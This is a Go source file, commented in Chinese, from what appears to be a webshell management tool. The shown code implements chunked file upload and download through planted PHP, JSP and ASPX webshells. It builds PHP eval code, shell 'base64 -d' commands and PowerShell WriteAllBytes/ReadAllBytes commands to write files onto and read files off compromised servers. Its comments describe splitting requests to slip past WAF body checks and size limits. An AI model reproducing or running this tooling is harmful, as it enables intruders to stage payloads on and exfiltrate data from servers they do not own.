package webshell

// 文件上传/下载：分块走，绝不把整个文件塞进一次请求。
//
// 为什么必须分块：一句话马的 POST body 会被目标侧的 max_post_size / WAF
// body 检查截断，而失败看起来像「马坏了」。分块之后每块都有独立回执，第 N 块
// 失败能精确指出断点，重试只补那一块。
//
// eval 型走 PHP 的 file_put_contents / file_get_contents（带 base64，二进制安全）；
// 命令型走系统自带的 base64 / PowerShell——这两者任一缺失会如实报错，不假装
// 成功（残留半截文件比失败更糟）。

import (
	"context"
	"fmt"
	"path"
	"strconv"
	"strings"
	"time"
)

const (
	// ChunkDefault 是单块默认大小。
	ChunkDefault = 512 * 1024
	// ChunkMax 是单块上限。
	ChunkMax = 512 * 1024
	// UploadMax 是单次上传总大小上限。
	UploadMax = 32 * 1024 * 1024
	// DownloadDefault 是单次下载默认上限。
	DownloadDefault = 2 * 1024 * 1024
	// DownloadMax 是单次下载上限。
	DownloadMax = 64 * 1024 * 1024
)

// UploadResult 是一次上传的结果。
type UploadResult struct {
	RemotePath string `json:"remote_path"`
	Bytes      int64  `json:"bytes"`
	Chunks     int    `json:"chunks"`
	Mode       string `json:"mode"`
	Egress     string `json:"egress"`
}

// DownloadResult 是一次下载的结果。
type DownloadResult struct {
	RemotePath string `json:"remote_path"`
	Data       []byte `json:"-"`
	Bytes      int64  `json:"bytes"`
	// RemoteSize 是远端文件真实大小；Bytes < RemoteSize 说明被 maxBytes 截断。
	RemoteSize int64  `json:"remote_size"`
	Truncated  bool   `json:"truncated,omitempty"`
	Text       bool   `json:"text"`
	Mode       string `json:"mode"`
	Egress     string `json:"egress"`
}

// clampChunk 把块大小收进 [4KB, ChunkMax]。太小会让请求数爆掉，太大容易被截断。
func clampChunk(n int) int {
	if n <= 0 {
		return ChunkDefault
	}
	if n > ChunkMax {
		return ChunkMax
	}
	if n < 4096 {
		return 4096
	}
	return n
}

// Upload 把 data 写到远端 remotePath。overwrite=false 且远端已存在时报错。
func (m *Manager) Upload(ctx context.Context, name, remotePath string, data []byte, chunkSize int, timeout time.Duration) (UploadResult, error) {
	sess, err := m.Get(name)
	if err != nil {
		return UploadResult{}, err
	}
	remotePath = strings.TrimSpace(remotePath)
	if remotePath == "" {
		return UploadResult{}, fmt.Errorf("%w：remote_path 不能为空", ErrInvalid)
	}
	if len(data) == 0 {
		return UploadResult{}, fmt.Errorf("%w：上传内容为空", ErrInvalid)
	}
	if len(data) > UploadMax {
		return UploadResult{}, fmt.Errorf("%w：单次上传上限 %d 字节（当前 %d）", ErrInvalid, UploadMax, len(data))
	}
	if timeout <= 0 {
		timeout = DefaultTimeout
	}
	chunk := clampChunk(chunkSize)

	res := UploadResult{RemotePath: remotePath, Bytes: int64(len(data)), Egress: egressLabel(&sess)}
	if sess.Type == "php" || sess.Type == "php_raw" {
		n := 0
		for off := 0; off < len(data); off += chunk {
			end := off + chunk
			if end > len(data) {
				end = len(data)
			}
			part := data[off:end]
			code := phpWriteCode(remotePath, part, off > 0)
			out, err := runPHPCode(ctx, name, sess, code, timeout)
			if err != nil {
				return res, fmt.Errorf("第 %d 块写入失败（已写 %d 字节，远端可能残留半截文件，需人工清理）: %w", n+1, off, err)
			}
			if !okWriteRE.MatchString(strings.TrimSpace(out)) {
				return res, fmt.Errorf("第 %d 块回执异常（期望 OK:<字节数>，实际 %q）", n+1, brief(out, 120))
			}
			n++
			res.Chunks = n
			res.Mode = "eval"
			if err := sleepCtx(ctx, 50*time.Millisecond); err != nil {
				return res, err
			}
		}
		m.AddArtifact(name, remotePath)
		return res, nil
	}

	// 命令型：整文件一次 base64 落盘（命令型马本身就是系统调用，没有 PHP 的
	// 分块累加语义；给单块上限，超了让人换 eval 型马或用 stage 投递）。
	if len(data) > chunk {
		return res, fmt.Errorf("%w：命令型马单次上传上限 %d 字节，当前 %d；"+
			"大文件请改用 stage_share 投递，或换成 php eval 型会话分块上传", ErrInvalid, chunk, len(data))
	}
	b64 := b64enc(data)
	var cmd string
	switch sess.Type {
	case "jsp":
		cmd = fmt.Sprintf("printf %%s '%s' | base64 -d > '%s' && wc -c < '%s'", b64, shellQuote(remotePath), shellQuote(remotePath))
	case "aspx":
		cmd = fmt.Sprintf(`powershell -nop -c "[IO.File]::WriteAllBytes('%s',[Convert]::FromBase64String('%s'));`+
			`(Get-Item '%s').Length"`, strings.ReplaceAll(remotePath, "'", "''"), b64, strings.ReplaceAll(remotePath, "'", "''"))
	default:
		return res, fmt.Errorf("%w：type %s 不支持上传", ErrInvalid, sess.Type)
	}
	out, mode, err := execCmd(ctx, name, sess, cmd, timeout)
	if err != nil {
		return res, fmt.Errorf("命令型上传失败: %w", err)
	}
	res.Chunks = 1
	res.Mode = mode
	if got := strings.TrimSpace(out); got != strconv.Itoa(len(data)) {
		return res, fmt.Errorf("远端报告写入 %s 字节，期望 %d（写入不完整）", brief(got, 40), len(data))
	}
	m.AddArtifact(name, remotePath)
	return res, nil
}

// Download 读远端文件。maxBytes<=0 用 DownloadDefault，超过 DownloadMax 报错。
func (m *Manager) Download(ctx context.Context, name, remotePath string, maxBytes int, timeout time.Duration) (DownloadResult, error) {
	sess, err := m.Get(name)
	if err != nil {
		return DownloadResult{}, err
	}
	remotePath = strings.TrimSpace(remotePath)
	if remotePath == "" {
		return DownloadResult{}, fmt.Errorf("%w：remote_path 不能为空", ErrInvalid)
	}
	if maxBytes <= 0 {
		maxBytes = DownloadDefault
	}
	if maxBytes > DownloadMax {
		return DownloadResult{}, fmt.Errorf("%w：单次下载上限 %d 字节", ErrInvalid, DownloadMax)
	}
	if timeout <= 0 {
		timeout = DefaultTimeout
	}
	res := DownloadResult{RemotePath: remotePath, Egress: egressLabel(&sess)}

	if sess.Type == "php" || sess.Type == "php_raw" {
		out, err := runPHPCode(ctx, name, sess, phpReadCode(remotePath, maxBytes), timeout)
		if err != nil {
			return res, err
		}
		size, raw, err := parseOKRead(out)
		if err != nil {
			return res, err
		}
		res.Data = raw
		res.Bytes = int64(len(raw))
		res.RemoteSize = size
		res.Truncated = size > int64(len(raw))
		res.Text = printable(raw)
		res.Mode = "eval"
		return res, nil
	}

	var cmd string
	switch sess.Type {
	case "jsp":
		cmd = fmt.Sprintf("f='%s'; test -f \"$f\" || { echo 'ERR:not a file'; exit; }; "+
			"stat -c %%s \"$f\"; head -c %d \"$f\" | base64 -w0", shellQuote(remotePath), maxBytes)
	case "aspx":
		cmd = fmt.Sprintf(`powershell -nop -c "$p='%s'; if(-not (Test-Path $p)){'ERR:not a file'}else{`+
			`$b=[IO.File]::ReadAllBytes($p); $n=[Math]::Min($b.Length,%d); `+
			`(Get-Item $p).Length; [Convert]::ToBase64String($b[0..($n-1)])}"`,
			strings.ReplaceAll(remotePath, "'", "''"), maxBytes)
	default:
		return res, fmt.Errorf("%w：type %s 不支持下载", ErrInvalid, sess.Type)
	}
	out, mode, err := execCmd(ctx, name, sess, cmd, timeout)
	if err != nil {
		return res, err
	}
	lines := strings.SplitN(strings.TrimSpace(out), "\n", 2)
	if len(lines) < 2 {
		return res, fmt.Errorf("下载回执格式异常（缺大小或内容行）: %s", brief(out, 200))
	}
	size, perr := strconv.ParseInt(strings.TrimSpace(lines[0]), 10, 64)
	if perr != nil {
		return res, fmt.Errorf("下载回执里没有合法大小: %s", brief(lines[0], 80))
	}
	raw, derr := b64dec(lines[1])
	if derr != nil {
		return res, fmt.Errorf("下载内容不是合法 base64: %v", derr)
	}
	res.Data = raw
	res.Bytes = int64(len(raw))
	res.RemoteSize = size
	res.Truncated = size > int64(len(raw))
	res.Text = printable(raw)
	res.Mode = mode
	return res, nil
}

// parseOKRead 解析 "OK|<size>|<b64>"。
func parseOKRead(out string) (int64, []byte, error) {
	s := strings.TrimSpace(out)
	if strings.HasPrefix(s, "ERR") {
		return 0, nil, fmt.Errorf("远端读取失败: %s", brief(s, 120))
	}
	m := okSizeRE.FindStringSubmatch(s)
	if m == nil {
		return 0, nil, fmt.Errorf("读取回执格式异常（期望 OK|<大小>|<base64>）: %s", brief(s, 160))
	}
	size, _ := strconv.ParseInt(m[1], 10, 64)
	raw, err := b64dec(s[len(m[0]):])
	if err != nil {
		return 0, nil, fmt.Errorf("读取内容不是合法 base64: %v", err)
	}
	return size, raw, nil
}

// shellQuote 用单引号包裹 shell 参数（内部单引号转义为 '\''）。
func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// joinRemote 拼远端路径（兼容 / 与 \ 两种风格）。
func joinRemote(dir, name string) string {
	dir = strings.TrimSpace(dir)
	if dir == "" {
		return name
	}
	if strings.Contains(dir, `\`) && !strings.Contains(dir, "/") {
		return strings.TrimRight(dir, `\`) + `\` + name
	}
	return path.Join(dir, name)
}
